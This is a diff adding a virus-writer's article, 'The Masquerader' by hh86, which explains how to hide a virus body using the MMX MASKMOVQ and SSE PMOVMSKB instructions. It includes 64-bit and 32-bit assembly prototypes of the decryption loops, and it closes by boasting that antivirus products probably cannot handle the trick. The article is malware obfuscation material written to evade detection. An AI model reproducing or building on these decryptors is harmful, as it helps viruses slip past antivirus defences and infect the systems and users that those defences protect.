@@ -1,0 +1,117 @@
+                                The Masquerader
+                                       by
+                                      hh86
+
+Masks on
+
+For long time I wanted to use a MMX  decryption engine.  MMX  was  introduced by
+Intel earlier, and it has lots of complex instructions.  Then AMD introduced few
+more instructions for it. Which I forgot in the time. And then some of them went
+for SSE by Intel little later.  However, for this virus I didn't employed any of
+those  complex  shuffling, packing, or logic  instructions.  I  only wanted one:
+MASKMOVQ.
+
+The interesting about this  instruction is that it moves to  memory a  32/64-bit
+value  conditionally.  It takes two operands, source  which holds value to move.
+Second operand is mask, the mask specifies which byte of the source must move to
+memory.   If most significant bit of each byte is on (in mask), then byte source
+is moved to  memory  (memory pointer is always in EDI/RDI), if off then nothing.
+
+
+Masquerade ceremony
+
+Basically,  I thought to use it in its 64-bit form, so that we can take  8 bytes
+strings.  From each string we randomly choose some bytes to be replaced.   Those
+bytes will be replaced by random byte.  Then we need to make a mask.  Let say xx
+marks chosen bytes and 00 non-chosen bytes  (therefore, the bytes of the virus):
+
+        00 xx 00 00 xx xx 00 xx
+
+This would be the mask:
+
+        00 80 00 00 80 80 00 80
+
+This mask says we do not overwrite the values of the 00s, we do overwrite the xx
+ones. So, we need to know the original values of the xxs, so they must be stored
+somewhere.   Now 00s mark original values, and xx random values, in 64-bit value 
+we saved to restore the virus:
+
+        xx 00 xx xx 00 00 xx 00
+
+Since the mask says to not overwrite some values, we can use random to obfuscate
+originals inside  64-bit string, and they will not be written to the virus body.
+
+Here is 64-bit code decryptor prototype.
+
+        call    skip_tables
+        ;tables go here
+
+skip_tables     label    near
+        pop     rdi                          ;always must be EDI the pointer to virus code
+        mov     ecx, size
+
+delta_size      label    near
+        lea     rsi, dword ptr [rdi + rcx]   ;pointer to mask table
+        lea     rbp, dword ptr [rsi + rcx]   ;pointer to original values table
+        push    rdi
+
+decrypt_loop    label    near
+        movq    mm0, qword ptr [rbp]
+        movq    mm1, qword ptr [rsi]
+        maskmovq mm0, mm1
+        scas    qword ptr [rdi]
+        lods    qword ptr [rsi]
+        add     rbp, 8
+        sub     rcx, 8
+        jnz     decrypt_loop
+
+Very small, isn't it? :)
+
+
+PMOVMSKB
+
+SSE provides us  with this  instruction to create a byte mask formed by the sign
+bit from each byte in the source operand.  So, if we want bit 1 then MSB must be
+set, otherwise must be 0. I use a 64-bit long value from which the mask is made,
+so  this  mean  we have a 64-bit key for each byte of the virus!  Unfortunately, 
+unlike MASKMOVQ the mask is not moved into memory directly.   It is moved in x86
+32-bit GP register.  We will need to allocate a long amount of space for our new
+key table this time.
+
+
+Masquerade ceremony
+
+For instance, we want to make value 0x48.  Here is encoded in binary:
+
+        0 1 0 0 1 0 1 0
+
+For it we would need a 64-bit key:
+
+        00 FF 00 00 FF 00 FF 00
+
+So simple.  Here is 32-bit code decryptor prototype.
+
+        call    skip_tables
+        ;tables go here
+
+skip_table      label    near
+        pop     edi
+        mov     ecx, codesize
+        mov     esi, edi
+
+decrypt_loop    label    near
+        movq    mm1, qword ptr [esi]
+        pmovmskb eax, mm1
+        stos    byte ptr [edi]
+        lods    dword ptr [esi]
+        lods    dword ptr [esi]
+        sub     ecx, 8
+        jnz     decrypt_loop
+
+Very small, isn't it? :)
+
+
+Ending
+
+Both instructions can be used for  much  more, though, and anti-viruses probably
+don't even support it, we are going to be fine for a while. ;) 
